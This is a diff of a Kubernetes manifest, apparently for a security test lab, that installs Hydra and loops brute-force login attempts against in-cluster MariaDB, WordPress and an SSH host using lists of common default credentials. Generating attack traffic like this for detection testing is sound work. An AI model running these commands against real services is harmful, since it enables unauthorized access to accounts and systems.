@@ -34,48 +34,35 @@ spec:
           command: ["/bin/sh", "-c"]
           args:
             - |
+              apk add --no-cache hydra 2>/dev/null || apt-get install -y hydra 2>/dev/null || true
               echo "Starting brute-force attack simulation (throttled)..."
 
-              cat > /tmp/users.txt <<EOF
-              admin
-              root
-              user
-              test
-              guest
-              EOF
-
-              cat > /tmp/passwords.txt <<EOF
-              password
-              123456
-              admin
-              root
-              letmein
-              changeme
-              EOF
+              printf 'admin\nroot\nuser\ntest\nguest\n' > /tmp/users.txt
+              printf 'password\n123456\nadmin\nroot\nletmein\nchangeme\n' > /tmp/passwords.txt
 
               while true; do
-                echo "[$(date)] === Brute-force cycle start ==="
+                echo "[$(date)] Brute-force cycle start"
 
                 echo "[$(date)] Attacking MariaDB..."
                 hydra -L /tmp/users.txt -P /tmp/passwords.txt \
-                  mariadb-sysbench-service.benign-workloads.svc.cluster.local \
-                  mysql -t 1 -w 10 -f 2>&1 || true
+                  mysql://mariadb-sysbench-service.benign-workloads.svc.cluster.local \
+                  -t 1 -w 10 -f 2>&1 || true
 
                 sleep 120
 
                 echo "[$(date)] Attacking WordPress..."
                 hydra -L /tmp/users.txt -P /tmp/passwords.txt \
-                  wordpress-app.benign-workloads.svc.cluster.local \
-                  http-post-form "/:username=^USER^&password=^PASS^:Invalid" \
+                  http-post-form://wordpress-app.benign-workloads.svc.cluster.local \
+                  -m "/:username=^USER^&password=^PASS^:Invalid" \
                   -t 1 -w 10 -f 2>&1 || true
 
                 sleep 120
 
                 echo "[$(date)] Attacking SSH..."
                 hydra -L /tmp/users.txt -P /tmp/passwords.txt \
-                  10.0.1.27 ssh -t 1 -w 10 -f 2>&1 || true
+                  ssh://10.0.1.27 -t 1 -w 10 -f 2>&1 || true
 
-                echo "[$(date)] === Cycle complete. Sleeping 300s ==="
+                echo "[$(date)] Cycle complete. Sleeping 300s "
                 sleep 300
               done
           resources:
